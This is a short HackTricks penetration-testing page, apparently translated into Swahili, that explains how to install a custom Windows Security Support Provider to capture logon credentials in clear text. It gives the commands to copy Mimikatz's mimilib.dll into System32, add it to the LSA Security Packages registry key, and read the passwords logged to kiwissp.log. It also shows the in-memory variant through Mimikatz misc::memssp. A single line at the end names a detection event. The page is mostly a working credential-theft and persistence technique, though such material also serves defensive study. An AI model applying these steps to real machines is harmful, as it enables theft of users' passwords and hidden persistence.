# Custom SSP

{{#include ../../banners/hacktricks-training.md}}

### Custom SSP

[Jifunze SSP (Security Support Provider) ni nini hapa.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Unaweza kuunda **SSP yako mwenyewe** ili **kunasa** **credentials** zinazotumiwa kufikia mashine katika **clear text**.

#### Mimilib

Unaweza kutumia binary ya `mimilib.dll` iliyotolewa na Mimikatz. **Hii itaandika credentials zote katika clear text ndani ya faili.**\
Weka dll katika `C:\Windows\System32\`\
Pata orodha ya LSA Security Packages zilizopo:
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
Ongeza `mimilib.dll` kwenye orodha ya Security Support Provider (Security Packages):
```bash
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
Na baada ya kuwasha upya, credentials zote zinaweza kupatikana katika maandishi wazi kwenye `C:\Windows\System32\kiwissp.log`

#### In memory

Unaweza pia ku-inject hii moja kwa moja kwenye memory ukitumia Mimikatz (kumbuka kwamba inaweza kuwa unstable kidogo/kutofanya kazi):
```bash
privilege::debug
misc::memssp
```
Hii haitadumu baada ya kuwasha upya.

#### Hatua za kupunguza madhara

Event ID 4657 - Kagua uundaji/mabadiliko ya `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

{{#include ../../banners/hacktricks-training.md}}
